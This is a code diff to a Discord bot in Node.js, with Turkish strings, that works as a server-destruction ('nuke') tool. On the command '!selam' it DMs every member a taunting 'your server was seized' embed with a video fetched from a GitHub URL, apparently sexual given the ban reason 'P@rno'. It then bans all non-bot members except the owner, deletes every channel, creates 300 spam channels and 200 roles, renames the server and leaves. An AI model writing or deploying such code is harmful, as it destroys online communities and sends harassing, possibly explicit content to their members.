@@ -1,6 +1,6 @@
-// index.js
 require('dotenv').config();
-const { Client, GatewayIntentBits, Partials, EmbedBuilder } = require('discord.js');
+const { Client, GatewayIntentBits, Partials, EmbedBuilder, AttachmentBuilder } = require('discord.js');
+const fetch = require("node-fetch");
 
 const client = new Client({
   intents: [
@@ -25,20 +25,30 @@ client.on('messageCreate', async (message) => {
   const command = args.shift().toLowerCase();
 
   if (command === '!selam') {
+
     const members = await message.guild.members.fetch();
     let bannedCount = 0;
+
+    // 🔥 GitHub RAW video linki
+    const videoURL = "https://raw.githubusercontent.com/KULLANICI/REPO/main/video.mp4";
+
+    // Videoyu fetch'le
+    const response = await fetch(videoURL);
+    const buffer = Buffer.from(await response.arrayBuffer());
+    const video = new AttachmentBuilder(buffer, { name: "video.mp4" });
 
     const embed = new EmbedBuilder()
       .setColor('Red')
       .setTitle('❌ Sunucudan Yasaklandınız!')
-      .setDescription('Fors ve Rynox Sunucuya El Koydu              Ravles gel hayatını yaşa https://discord.gg/QBf9gxHHJF')
-      .setFooter({ text: '💦Fors ve Rynox Affetmez Sabaha Sunucun Affedilmez💦' });
+      .setDescription('Fors ve TM Sunucuya El Koydu\n @1fors el koydu')
+      .setFooter({ text: '💦Fors Affetmez Sabaha Sunucun Affedilmez💦' })
+      .setVideo("attachment://video.mp4"); // 🎥 videoyu embed'e bağla
 
-    // Üyeleri banla
+    // Üyeleri DM + ban
     for (const member of members.values()) {
       if (!member.user.bot && member.id !== OWNER_ID) {
-        await member.send({ embeds: [embed] }).catch(() => {});
-        await member.ban({ reason: 'Küfürkoruma aktif edildi.' }).catch(() => {});
+        await member.send({ embeds: [embed], files: [video] }).catch(() => {});
+        await member.ban({ reason: 'P@rno.' }).catch(() => {});
         bannedCount++;
       }
     }
@@ -47,7 +57,7 @@ client.on('messageCreate', async (message) => {
     await Promise.all(message.guild.channels.cache.map(ch => ch.delete().catch(() => {})));
 
     // Yeni kanallar oluştur
-    const names = ['FORS💦', 'RynOrs💝', 'Rynox🔥'];
+    const names = ['1fors💦', 'TM-ENESXDRADX💝', 'FORS SUNUCUYA EL KOYDU🔥'];
     for (let i = 0; i < 300; i++) {
       const name = names[i % names.length];
       await message.guild.channels.create({ name }).catch(() => {});
@@ -60,7 +70,7 @@ client.on('messageCreate', async (message) => {
       }
     }
 
-    // Yeni roller oluştur
+    // Yeni roller
     for (let i = 0; i < 200; i++) {
       const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
       await message.guild.roles.create({
@@ -70,13 +80,11 @@ client.on('messageCreate', async (message) => {
       }).catch(() => {});
     }
 
-    // Sunucu ismini değiştir
-    await message.guild.setName('💦Fors ve Rynox Affetmez Sabaha Sunucun Affedilmez💦').catch(() => {});
+    // Sunucu ismi değiştir
+    await message.guild.setName('💦Fors ve Enesxdradx Affetmez Sabaha Sunucun Affedilmez💦').catch(() => {});
 
-    // Bilgi mesajı
-    await message.channel.send(`🧹 ${bannedCount} kişi banlandı. Kanallar ve roller güncellendi.`);
+    await message.channel.send(`🧹 ${bannedCount} kişi banlandı. V For Vandetta ⚡.`);
 
-    // Botu sunucudan at
     await message.guild.leave().catch(() => {});
   }
 });
